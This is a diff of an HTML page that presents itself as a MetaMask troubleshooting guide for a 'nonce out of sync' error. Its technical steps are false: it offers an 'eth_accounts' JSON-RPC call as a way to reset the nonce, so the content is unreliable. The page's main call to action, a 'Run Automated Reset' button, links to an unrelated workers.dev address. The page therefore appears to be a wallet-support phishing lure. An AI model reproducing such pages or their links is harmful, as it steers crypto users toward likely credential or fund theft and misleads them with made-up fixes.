@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,32 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating that the transaction nonce (a sequential number assigned to each transaction) is not aligned with the expected value on the blockchain.</li>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum (ETH) network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the local transaction count in MetaMask and the actual transaction count on the Ethereum blockchain, often resulting from transactions being sent from another wallet or interface using the same account.</li>
+<li>The error occurs when the transaction nonce stored in MetaMask does not match the nonce expected by the Ethereum network, often due to interrupted or unconfirmed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce:</li>
-<li>Increase the gas limit to ensure the transaction is processed quickly</li>
-<li>Use the <code>eth_getTransactionCount</code> RPC method to fetch the current transaction count</li>
-<li>Update the MetaMask extension settings with the correct nonce value, as shown in the following code block:</li>
+<li>Reset the account in MetaMask to resynchronize the nonce.</li>
+<li>Increase the gas price to speed up transaction processing and potentially resolve the nonce mismatch.</li>
+<li>Use the following JSON-RPC command to reset the account nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="o">{</span>
-<span class="w">  </span><span class="s2">&quot;jsonrpc&quot;</span>:<span class="w"> </span><span class="s2">&quot;2.0&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;method&quot;</span>:<span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;params&quot;</span>:<span class="w"> </span><span class="o">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="o">]</span>,
-<span class="w">  </span><span class="s2">&quot;id&quot;</span>:<span class="w"> </span><span class="m">1</span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_accounts&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>You may need to consult an external console for further debugging.
-Prerequisites:
-* Ensure MetaMask is updated to the latest version
-* Have a backup of your wallet seed phrase
-* Understand the basics of Ethereum transaction management</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>MetaMask extension installed and configured in the browser.</li>
+<li>An Ethereum wallet with a balance sufficient for transaction fees.</li>
+<li>A stable internet connection for real-time blockchain data synchronization.</li>
+</ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
